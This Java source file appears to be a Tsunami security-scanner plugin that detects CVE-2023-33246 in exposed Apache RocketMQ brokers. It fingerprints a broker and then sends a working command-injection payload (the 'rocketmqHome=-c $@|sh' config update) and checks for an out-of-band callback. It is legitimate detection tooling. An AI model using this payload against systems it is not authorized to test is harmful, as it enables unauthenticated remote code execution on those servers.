/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.rocketMQ;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.HostAndPort;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.net.Socket;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;
import javax.inject.Qualifier;
import javax.net.SocketFactory;

/** A Tsunami plugin that detects RCE in RocketMQ exposed broker */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ApacheRocketMQCVE202333246RCEVulnDetector",
    version = "0.1",
    description = "This plugin detects RCE in RocketMQ exposed broker",
    author = "Alessandro Versari (alessandro.versari@doyensec.com)",
    bootstrapModule = ApacheRocketMQCVE202333246RCEVulnDetectorBootstrapModule.class)
public final class ApacheRocketMQCVE202333246RCEVulnDetector implements VulnDetector {

  @VisibleForTesting
  public static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";

  @VisibleForTesting public static final String VULNERABILITY_REPORT_ID = "CVE-2023-33246";

  @VisibleForTesting
  public static final String VULNERABILITY_REPORT_TITLE =
      "RocketMQ Open Access Remote Code Execution";

  @VisibleForTesting
  public static final String VULNERABILITY_REPORT_DESCRIPTION =
      "In Apache RocketMQ versions up to 4.9.6 and 5.1.0, unauthenticated attackers can exploit "
          + "a misconfigured update configuration function to execute arbitrary system commands, "
          + "potentially leading to full system compromise.";

  @VisibleForTesting
  public static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Upgrade to RocketMQ version 4.9.6 or later for the 4.x series, or 5.1.1 or later for the 5.x"
          + " series.";

  @VisibleForTesting
  public static final String VULNERABILITY_REPORT_DETAILS =
      "This vulnerability arises due to insufficient permission verification in the update"
          + " configuration function of RocketMQ's NameServer, Broker, and Controller components."
          + " By sending specially crafted binary payloads, attackers can manipulate configurations"
          + " and execute arbitrary system commands.";

  @VisibleForTesting public static final Duration OOB_SLEEP_DURATION = Duration.ofSeconds(5);

  private static final Severity vulnSeverity = Severity.CRITICAL;

  private final SocketFactory socketFactory;

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;
  private String RCE_TEMPLATE =
      "`{\"code\":25,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}filterServerNums=1\n"
          + "rocketmqHome=-c $@|sh . echo COMMAND;\n";
  private static String FINGERPRINT_PAYLOAD =
      "`{\"code\":12,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":500}\n";

  @Inject
  ApacheRocketMQCVE202333246RCEVulnDetector(
      @SocketFactoryInstance SocketFactory socketFactory,
      @UtcClock Clock utcClock,
      PayloadGenerator payloadGenerator)
      throws IOException {
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.socketFactory = checkNotNull(socketFactory);
  }

  // This is the main entry point of VulnDetector.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("ApacheRocketMQCVE202333246RCEVulnDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isRocketMQBroker)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  // Helper method to convert hex string to byte array
  private byte[] hexStringToByteArray(String hex) {
    int len = hex.length();
    byte[] data = new byte[len / 2];
    for (int i = 0; i < len; i += 2) {
      data[i / 2] =
          (byte)
              ((Character.digit(hex.charAt(i), 16) << 4) + Character.digit(hex.charAt(i + 1), 16));
    }
    return data;
  }

  // Helper method to convert hex string to byte array
  private byte[] addRocketMQHeader(String payload) throws IOException {
    byte[] buf = payload.getBytes();

    int headerLength = 3;
    String header = "000000" + Integer.toHexString(buf.length + headerLength) + "000000";

    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
    outputStream.write(hexStringToByteArray(header));
    outputStream.write(buf);

    return outputStream.toByteArray();
  }

  // Checks whether a given service is a rocketMQ  broker
  private boolean isRocketMQBroker(NetworkService networkService) {
    HostAndPort hp = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());

    try {
      byte[] payload = addRocketMQHeader(FINGERPRINT_PAYLOAD);

      Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
      socket.setSoTimeout(500);

      socket.getOutputStream().write(payload);

      byte[] responseBuffer = new byte[1024];
      int bytesRead = socket.getInputStream().read(responseBuffer, 0, responseBuffer.length);
      if (bytesRead <= 0) {
        logger.atWarning().log("%d bytes read (-1 means EOF) from service.", bytesRead);
        return false;
      }

      String response = new String(responseBuffer, 0, bytesRead, UTF_8);

      return response.contains("org.apache.rocketmq.broker")
          || response.contains("brokerVersionDesc");
    } catch (IOException e) {
      logger.atWarning().log("error during connection to %s: %s", hp.toString(), e);
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    HostAndPort hp = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());

    // Generate the payload for the callback server
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload callbackPayload = null;

    try {
      callbackPayload = this.payloadGenerator.generate(config);
    } catch (NotImplementedException e) {
      return false;
    }

    if (!callbackPayload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log("Tsunami Callback Server not available: cannot detect rce");
      return false;
    }

    try {
      byte[] payload =
          addRocketMQHeader(RCE_TEMPLATE.replace("COMMAND", callbackPayload.getPayload()));

      Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
      socket.getOutputStream().write(payload);
    } catch (IOException e) {
      logger.atWarning().log("failed to send rce payload to %s", hp.toString());
      return false;
    }

    Uninterruptibles.sleepUninterruptibly(OOB_SLEEP_DURATION);

    if (callbackPayload.checkIfExecuted()) {
      logger.atInfo().log("Target %s is vulnerable", hp.toString());
      return true;
    } else {
      logger.atInfo().log("Target %s is not vulnerable", hp.toString());
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(vulnSeverity)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION)
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setTextData(TextData.newBuilder().setText(VULNERABILITY_REPORT_DETAILS))))
        .build();
  }

  @Qualifier
  @Retention(RetentionPolicy.RUNTIME)
  @interface SocketFactoryInstance {}
}
